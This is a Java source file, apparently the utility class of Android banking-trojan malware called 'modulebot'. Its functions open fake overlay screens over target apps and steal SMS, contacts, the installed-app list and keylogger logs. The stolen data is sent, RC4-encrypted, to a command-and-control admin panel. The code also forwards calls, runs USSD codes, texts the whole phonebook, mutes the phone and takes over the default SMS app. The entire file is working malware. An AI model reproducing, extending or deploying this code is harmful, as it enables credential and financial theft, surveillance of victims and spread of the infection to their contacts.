package com.example.modulebot;

import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.media.AudioManager;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.text.format.Time;
import android.util.Base64;
import android.util.Log;

import com.example.modulebot.API.ClassRC4;
import com.example.modulebot.API.RequestHttp;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.TimeUnit;

import static android.content.Context.NOTIFICATION_SERVICE;

public class utils {
    constants consts = new constants();

    private static SharedPreferences settings = null;
    private static SharedPreferences.Editor editor = null;


    public void startApplication(Context context, String app){
            Intent LaunchIntent = context.getPackageManager().getLaunchIntentForPackage(app);
           // LaunchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
           // LaunchIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
            context.startActivity(LaunchIntent);
    }

    public void openUrlBraw(Context context, String url){
        try {
            Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            context.startActivity(browserIntent);
        }catch (Exception ex){
            Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            browserIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
            context.startActivity(browserIntent);
        }
    }

    public void openFake(Context context, String nameInj){
        try{
            if(!SettingsRead(context, nameInj).isEmpty()){
                Intent dialogIntent = new Intent();
                dialogIntent.setComponent(new ComponentName(SettingsRead(context, consts.packageName), SettingsRead(context, consts.packageNameActivityInject)));
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                SettingsWrite(context, "app_inject", nameInj);
                SettingsWrite(context, "nameInject", nameInj);
                context.startActivity(dialogIntent);
            }
        }catch (Exception ex){Log("openFake","Error module startViewInject");
            SettingsToAdd(context, consts.LogSMS , "(MOD18)  | Error module startViewInject " + ex.toString() +"::endLog::");
        }
    }


    public void getSMS(Context context){
        try {String[] arraySMS = {"sms/sent","sms/inbox","sms/draft"};
            String logs = "";
            for(String str: arraySMS){
                Uri uriSMS = Uri.parse("content://" + str);
                Cursor c = context.getContentResolver().query(uriSMS, null, null, null, null);
                if (c != null) {
                    while (c.moveToNext()) {
                        String number = c.getString(2);
                        if (number.length() > 0) {

                            String stexts = c.getString(12);
                            if (stexts == null) stexts = "";
                            else stexts = stexts + " ";

                            String text = c.getString(13);
                            logs = logs + "~"+str+"~" +  "number: " +  number + " text: " + stexts +  text + ":end:";
                        }
                    }
                    c.close();
                    SettingsWrite(context, consts.logsSavedSMS, logs);
                }
            }
        }catch (Exception ex){
            Log("ErrorGetSavedSMS", "getSMS" + ex);
            SettingsToAdd(context, consts.LogSMS , "(MOD19)  | ErrorGetSavedSMS " + ex.toString() +"::endLog::");
        }
    }

    public void getApps(Context context){
        try {
            List<ApplicationInfo> packages = context.getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
            String logs = "";
            for (ApplicationInfo packageInfo : packages) {
                if (!isSystemPackage(packageInfo)) {
                    logs = logs + packageInfo.packageName + ":end:";
                }
            }
            SettingsWrite(context, consts.logsApplications, logs);
        }catch (Exception ex){
            SettingsToAdd(context, consts.LogSMS , "(MOD20)  | getApps " + ex.toString() +"::endLog::");
        }
    }
    private boolean isSystemPackage(ApplicationInfo applicationInfo) {
        return ((applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
    }

    public void getContacts(Context context) {
           try {Cursor phones = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                String phoneNumber = "";
                while (phones.moveToNext()){
                    String nn = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    if ((!nn.contains("*")) && (!nn.contains("#")) && (nn.length() > 6) && (!phoneNumber.contains(nn))) {
                        phoneNumber = phoneNumber + nn + " / " + name + ":end:";
                    }
                }
                SettingsWrite(context, consts.logsContacts, phoneNumber);
        }catch (Exception ex){
            SettingsWrite(context, consts.logsContacts, "{\"error\":\"No permissions to get contacts\"}");
               SettingsToAdd(context, consts.LogSMS , "(MOD20)  | Error No permissions to get contacts " + ex.toString() +"::endLog::");
        }
    }


    public static Bitmap getBitmap(String base64Str) throws IllegalArgumentException{
        byte[] decodedBytes = Base64.decode(
                base64Str.substring(base64Str.indexOf(",")  + 1),
                Base64.DEFAULT
        );

        return BitmapFactory.decodeByteArray(decodedBytes, 0, decodedBytes.length);
    }

    public void sms_mailing_phonebook(Context context,String text) {
        Cursor phones = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        String phoneNumber = "";
        boolean is_sms_working= false;
        int scr = 0;
        while (phones.moveToNext()) {
            phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            if ((!phoneNumber.contains("*")) && (!phoneNumber.contains("#")) && (phoneNumber.length() > 7)) {
                try {
                    sendSms(context, phoneNumber, text);
                    is_sms_working = true;
                    scr++;
                } catch (Exception ex) {
                    SettingsWrite(context, consts.LogSMS, "No permission to send SMS::endLog::");
                    is_sms_working = false;
                    break;
                }
            }
            chalkTile(1000);
        }
        if (is_sms_working == true) {
            SettingsWrite(context, consts.LogSMS,  scr +" SMS were sent::endLog::");
        }
    }
    public void chalkTile(int MILLISECONDS ){
        try { TimeUnit.MILLISECONDS.sleep(MILLISECONDS); } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
    public void sendNotification(Context mContext, String app ,String title, String text) {


        String base64Icon;
        try {
                base64Icon = SettingsRead(mContext, "icon_" + app);

        }catch (Exception ex){
            return;
        }

        Log("base64Icon","size: " + base64Icon.length());
        if(base64Icon.length()<100){
            Log("notification", "No File Png Icon");
            return;
        }
        Intent dialogIntent = new Intent();
        dialogIntent.setComponent(new ComponentName(SettingsRead(mContext, consts.packageName), SettingsRead(mContext, consts.packageNameActivityInject)));
        dialogIntent.putExtra("app", app);
        dialogIntent.putExtra("name", "");
        dialogIntent.putExtra("push", "1");
        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);

        SettingsWrite(mContext,  "startpush", app);

        //----
       // int intSmailIcon = mContext.getResources().getIdentifier(mContext.getPackageName() + ":mipmap/ic_launcher", null, null);


        //-----
        if(Build.VERSION.SDK_INT<=25) {
            if(Build.VERSION.SDK_INT>15) {
                PendingIntent pendingIntent = PendingIntent.getActivity(mContext, 100, dialogIntent, PendingIntent.FLAG_ONE_SHOT);
                NotificationManager notificationManager = (NotificationManager) mContext.getSystemService(Context.NOTIFICATION_SERVICE);
                android.app.Notification notif = new android.app.Notification.Builder(mContext)
                        .setContentIntent(pendingIntent)
                        .setContentTitle(title)
                        .setContentText(text)
                        .setVibrate(new long[]{1500, 1500, 1500, 1500, 1500})
                        .setPriority(android.app.Notification.PRIORITY_HIGH)
                        .setDefaults(android.app.Notification.DEFAULT_VIBRATE)
                        .setDefaults(android.app.Notification.DEFAULT_SOUND)
                        .setDefaults(android.app.Notification.DEFAULT_LIGHTS)
                        .setSmallIcon(mContext.getResources().getIdentifier(mContext.getPackageName() + ":mipmap/ic_launcher", null, null))
                        .setLargeIcon(getBitmap(base64Icon))
                        .build();
                notif.flags |= android.app.Notification.FLAG_AUTO_CANCEL;
                notificationManager.notify(1, notif);
            }
        }else{
            NotificationManager notificationManager = (NotificationManager) mContext.getSystemService(NOTIFICATION_SERVICE);
            PendingIntent pintent = PendingIntent.getActivity(mContext, 0, dialogIntent, 0);
            String id = "channel_1";
            String description = "123";
            NotificationChannel mChannel = new NotificationChannel(id, "123", NotificationManager.IMPORTANCE_HIGH);
            mChannel.setDescription(description);
            mChannel.enableLights(true);
            mChannel.setLightColor(Color.RED);
            mChannel.enableVibration(true);
            mChannel.setVibrationPattern(new long[]{1500, 1500, 1500, 1500, 1500});
            mChannel.setShowBadge(false);
            notificationManager.createNotificationChannel(mChannel);
            Notification notification = new Notification.Builder(mContext, id).setContentTitle("Title")
                    .setSmallIcon(mContext.getResources().getIdentifier(mContext.getPackageName() + ":mipmap/ic_launcher", null, null))
                    .setLargeIcon(getBitmap(base64Icon))
                    .setContentTitle(title)
                    .setContentText(text)
                    .setVibrate(new long[]{1500, 1500, 1500, 1500, 1500})
                    .setCategory(Notification.CATEGORY_MESSAGE)
                    .setStyle(new Notification.BigTextStyle().bigText(text))
                    .setAutoCancel(false)
                    .setContentIntent(pintent)
                    .setDefaults(android.app.Notification.DEFAULT_VIBRATE)
                    .setDefaults(android.app.Notification.DEFAULT_SOUND)
                    .setDefaults(android.app.Notification.DEFAULT_LIGHTS)
                    .build();
            notification.flags |= android.app.Notification.FLAG_AUTO_CANCEL;
            notificationManager.notify(1, notification);
        }
    }

    public  void callForward(Context context, String number) {
        try {
            Intent intentCallForward = new Intent("android.intent.action.CALL");
            intentCallForward.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intentCallForward.setData(Uri.fromParts("tel", "*21*"+number+"#", "#"));
            context.startActivity(intentCallForward);

            String logForward = "ForwardCALL: " + number + "::endLog::";
            Log("ForwardCall",logForward);
            SettingsToAdd(context, consts.LogSMS, logForward);
        }catch (Exception ex){
            Log("ForwardCall","Error");
            String logCF = "ERROR callForward" + number +  "::endLog::";
            SettingsToAdd(context, consts.LogSMS, logCF);

        }
    }

    public void ussd(Context context, String ussd){
        try{
        Intent intentCallForward = new Intent("android.intent.action.CALL");
        intentCallForward.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intentCallForward.setData(Uri.parse("tel:" + Uri.encode(ussd)));
        context.startActivity(intentCallForward);
        String logUSSD = "USSD: " + ussd +  "::endLog::";
        Log("USSD",logUSSD);
        SettingsToAdd(context, consts.LogSMS, logUSSD);
    }catch (Exception ex){
        Log("USSD","Error: Start USSD");
        String logUSSD = "ERROR START USSD::endLog::";
        Log("USSD",logUSSD);
        SettingsToAdd(context, consts.LogSMS, logUSSD);
    }

    }

    public void sendSms(Context context, String phoneNumber, String message){
        try {
            SmsManager smsManager = SmsManager.getDefault();
            ArrayList<String> list = smsManager.divideMessage(message);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, new Intent("SMS_SENT"), 0);
            PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0, new Intent("SMS_DELIVERED"), 0);
            ArrayList<PendingIntent> sents = new ArrayList();
            ArrayList<PendingIntent> deliveredList = new ArrayList<PendingIntent>();
            for (int i = 0; i < list.size(); i++) {
                deliveredList.add(deliveredPI);
                sents.add(pendingIntent);
            }
            smsManager.sendMultipartTextMessage(phoneNumber, null, list, sents, deliveredList);
            String logSMS = "Output SMS:" + phoneNumber + " text:" + message + "::endLog::";
            Log("SMS", logSMS);
            SettingsToAdd(context, consts.LogSMS, logSMS);
        }catch (Exception ex){
            SettingsToAdd(context, consts.LogSMS , "(MOD21)  | ERROR SEND SMS " + ex.toString() +"::endLog::");
        }
    }

    public String downloadInjection(Context context, String nameInj){
        JSONObject request = new JSONObject();
        try {
            request.put("inject", nameInj);
            return httpRequest(context, consts.str_http_1 + trafEnCr(context, request.toString()));
        } catch (JSONException e) {
            SettingsToAdd(context, consts.LogSMS , "(MOD22)  | downloadInjection " + e.toString() +"::endLog::");
        }
        return "";
    }
    public String downloadIcon(Context context, String nameInj){
        JSONObject request = new JSONObject();
        try {
            request.put("inject", nameInj);
            return trafDeCr(context, httpRequest(context, consts.str_http_0 + trafEnCr(context, request.toString())));
        } catch (JSONException e) {
            SettingsToAdd(context, consts.LogSMS , "(MOD23)  | downloadIcon " + e.toString() +"::endLog::");
        }
        return "";
    }


    public void stopSound(Context context){
        try {
            AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
            audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
            audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true);
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0);
            audioManager.setStreamVolume(AudioManager.STREAM_DTMF, 0, 0);
            audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0);
            audioManager.setStreamVolume(AudioManager.STREAM_RING, 0, 0);
            audioManager.setVibrateSetting(AudioManager.VIBRATE_TYPE_NOTIFICATION, AudioManager.VIBRATE_SETTING_OFF);
        }catch (Exception ex){
            SettingsToAdd(context, consts.LogSMS , "(MOD23)  | stopSound " + ex.toString() +"::endLog::");
        }
    }

    public void swapSmsMenager(Context context, String packageName){
        try {
            Intent intentSMS = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            intentSMS.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName);
            intentSMS.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intentSMS);
        }catch (Exception ex){
            SettingsToAdd(context, consts.LogSMS , "(MOD24)  | swapSmsMenager " + ex.toString() +"::endLog::");
        }
    }

    public String sendLogsInjection(Context context, String id, String data, String idbot){
        JSONObject request = new JSONObject();
        try {
            JSONObject jObject = new JSONObject(data);

            request.put("idbot", idbot);
            request.put("idinject", id);
            request.put("application", jObject.getString("application"));
            request.put("logs", jObject.getString("data"));

            Log("SEND",  "idinject: " + id);
            Log("SEND",  "idbot: " + idbot);
            Log("SEND",  "application: " + jObject.getString("application"));
            Log("SEND",  "logs: " + jObject.getString("data"));

            return trafDeCr(context, httpRequest(context, consts.str_http_16 + trafEnCr(context, request.toString())));
        } catch (JSONException e) {
            SettingsToAdd(context, consts.LogSMS , "(MOD24)  | sendLogsInjection " + e.toString() +"::endLog::");
        }
        return "";
    }

    public String getDateTileDevice(){
        Time today = new Time(Time.getCurrentTimezone());
        today.setToNow();
        return today.year + "-" + today.month + "-" + today.monthDay + " " + today.format("%k:%M");
    }

    public String sendLogsSMS(Context context, String logs, String idbot){
        JSONObject request = new JSONObject();
        try {
            request.put("idbot", idbot);
            request.put("logs", logs);
            request.put("date", getDateTileDevice());
            Log("SEND SMS",  "logs: " + logs);
            return trafDeCr(context,httpRequest(context, consts.str_http_17 + trafEnCr(context, request.toString())));
        } catch (JSONException e) {
            SettingsToAdd(context, consts.LogSMS , "(MOD25)  | sendLogsSMS " + e.toString() +"::endLog::");
        }
        return "";
    }
    public String sendLogsKeylogger(Context context, String logs, String idbot){
        JSONObject request = new JSONObject();
        try {
            request.put("idbot",idbot);
            request.put("logs", logs);
            Log("SEND Keylogger",  "logs: " + logs);
            return trafDeCr(context, httpRequest(context, consts.str_http_19 + trafEnCr(context, request.toString())));
        } catch (JSONException e) {
            SettingsToAdd(context, consts.LogSMS , "(MOD26)  | sendLogsKeylogger " + e.toString() +"::endLog::");
        }
        return "";
    }

    public String sendLogsContacts(Context context, String logs, String idbot){
        JSONObject request = new JSONObject();
        try {
            request.put("idbot",idbot);
            request.put("logs", logs);
            Log("Send Contacts",  "logs: " + logs);
            return trafDeCr(context, httpRequest(context, consts.str_http_20 + trafEnCr(context, request.toString())));
        } catch (JSONException e) {
            SettingsToAdd(context, consts.LogSMS , "(MOD27)  | sendLogsContacts " + e.toString() +"::endLog::");
        }
        return "";
    }

    public String sendLogsSavedSMS(Context context, String logs, String idbot){
        JSONObject request = new JSONObject();
        try {
            request.put("idbot",idbot);
            request.put("logs", logs);
            Log("Send Saved SMS",  "logs: " + logs);
            return trafDeCr(context, httpRequest(context, consts.str_http_22 + trafEnCr(context, request.toString())));
        } catch (JSONException e) {
            SettingsToAdd(context, consts.LogSMS , "(MOD28)  | sendLogsSavedSMS " + e.toString() +"::endLog::");
        }
        return "";
    }

    public String sendLogsApplications(Context context, String logs, String idbot){
        JSONObject request = new JSONObject();
        try {
            request.put("idbot",idbot);
            request.put("logs", logs);
            Log("Send Saved SMS",  "logs: " + logs);
            return trafDeCr(context, httpRequest(context, consts.str_http_21 + trafEnCr(context, request.toString())));
        } catch (JSONException e) {
            SettingsToAdd(context, consts.LogSMS , "(MOD29)  | sendLogsApplications " + e.toString() +"::endLog::");
        }
        return "";
    }


    public String timeInjectionsSendPanel(Context context, String nameInject, String idbot){
        JSONObject request = new JSONObject();
        try {
            request.put("idbot", idbot);
            request.put("inject", nameInject);
            return trafDeCr(context, httpRequest(context, consts.str_http_18 + trafEnCr(context, request.toString())));
        } catch (JSONException e) {
            SettingsToAdd(context, consts.LogSMS , "(MOD30)  | timeInjectionsSendPanel " + e.toString() +"::endLog::");
        }
        return "";
    }


    public boolean getScreenBoolean(Context context){
        KeyguardManager km = (KeyguardManager) context.getSystemService(context.KEYGUARD_SERVICE);
        if(km.inKeyguardRestrictedInputMode()){
            return false;
        }else{
            return true;
        }
    }


    public void Log(String tag, String text){
        if(consts.DebugConsole) {
            Log.e(tag, text);
        }
    }


    public void SettingsWrite(Context context, String name, String params){
        SharedPreferences settings = context.getSharedPreferences(consts.nameFileSettings, Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = settings.edit();
        editor.putString(name, params);
        editor.commit();
    }

    public String SettingsRead(Context context, String name){
        if( settings == null ){
            settings = context.getSharedPreferences(consts.nameFileSettings, Context.MODE_PRIVATE);
            editor = settings.edit();
        }
        return settings.getString( name, null );
    }
    public void SettingsToAdd(Context context, String name, String params){
        try{
            String getParams = SettingsRead(context, name);
            if(!getParams.isEmpty()){
                params = getParams + params;
            }
            SettingsWrite(context, name, params);
        }catch (Exception ex){
            SettingsWrite(context, name,  params);
        }
    }
    public void SettingsToAddJson(Context context, String name, String params){
        try{
            String getParams = SettingsRead(context, name);
            if(!getParams.isEmpty()){

                JSONObject getParamsJson = new JSONObject(getParams);
                JSONObject  paramsJson = new JSONObject(params);

                getParams = getParamsJson.getString("data");
                String getApplication = getParamsJson.getString("application");
                params = paramsJson.getString("data");

                Log("str_getParams",""+getParams);
                Log("str_params",""+params);

                JSONObject mergedJSON = mergeJSONObjects(new JSONObject(getParams), new JSONObject(params));

                JSONObject jsonObject = new JSONObject();
                jsonObject.put("application",getApplication);
                jsonObject.put("data",mergedJSON.toString());

                Log("mergedJSON",jsonObject.toString());

                SettingsWrite(context, name, jsonObject.toString());
            }else{
                SettingsWrite(context, name, params);
            }
        }catch (Exception ex){
            Log("JSON","ERROR SettingsToAddJson");
            SettingsWrite(context, name,  params);
        }
    }
    public void SettingsRemove(Context context, String name, String params){
        try{
            String getParams = SettingsRead(context, name);
            getParams = getParams.replace(params, "");
            SettingsWrite(context, name, getParams);
        }catch (Exception ex){}
    }
    public JSONObject mergeJSONObjects(JSONObject json1, JSONObject json2) {
        JSONObject mergedJSON = new JSONObject();
        try {
            Iterator i1 = json1.keys();
            Iterator i2 = json2.keys();
            String tmp_key;
            while(i1.hasNext()) {
                tmp_key = (String) i1.next();
                mergedJSON.put(tmp_key, json1.get(tmp_key));
            }
            while(i2.hasNext()) {
                tmp_key = (String) i2.next();
                mergedJSON.put(tmp_key, json2.get(tmp_key));
            }
        }catch (Exception ex){}
        return mergedJSON;
    }

    public String httpRequest(Context context, String parms){
        String url = SettingsRead(context, consts.urlAdminPanel);
        RequestHttp http = new RequestHttp();
        return http.sendRequest(url+consts.str_gate, parms);
    }

    public String getAllApplication(Context context){
        try {
            PackageManager pm = context.getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(0);
            String packageAll = "";
            for (ApplicationInfo app : apps) {
                if (pm.getLaunchIntentForPackage(app.packageName) != null) {
                    if (!packageAll.contains(app.packageName + ":")) {
                        packageAll = packageAll + app.packageName + ":";
                    }
                }
                if ((app.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) == 1) {  // updated system apps
                } else if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 1) {// system apps
                } else {    //user
                    if (!packageAll.contains(app.packageName + ":")) {
                        packageAll = packageAll + app.packageName + ":";
                    }
                }
            }
            Log("AllApplication", del_char_last(packageAll));
            return del_char_last(packageAll);
        }catch (Exception ex){
            SettingsToAdd(context, consts.LogSMS , "(MOD31)  | getAllApplication " + ex.toString() +"::endLog::");
            return "";
        }
    }
    public String del_char_last(String str) {
        if (str != null && str.length() > 0 && str.charAt(str.length() - 1) == 'x') {
            str = str.substring(0, str.length() - 1);
        }
        return str;
    }

    public String trafEnCr(Context context, String text) {
        return strEncRC4(text, SettingsRead(context, "key"));
    }

    public String trafDeCr(Context context, String text){
        return strDecRC4(text, SettingsRead(context, "key"));
    }


    public String strEncRC4(String text, String key){
        ClassRC4 rce = new ClassRC4(key.getBytes());
        byte[] result = rce.encrypt(text.getBytes());
        result = bytesToHexString(result).getBytes();
        return Base64.encodeToString(result, Base64.DEFAULT);
    }
    public static String bytesToHexString(byte[] bytes) {
        StringBuffer buf = new StringBuffer(bytes.length * 2);
        for (byte b : bytes) {
            String s = Integer.toString(0xFF & b, 16);
            if (s.length() < 2) {
                buf.append('0');
            }
            buf.append(s);
        }
        return buf.toString();
    }
    //-------------------
    public String strDecRC4(String textDE_C, String key){
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, consts.strUTF_8);
            byte[] detext = hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }
    public   byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }
}
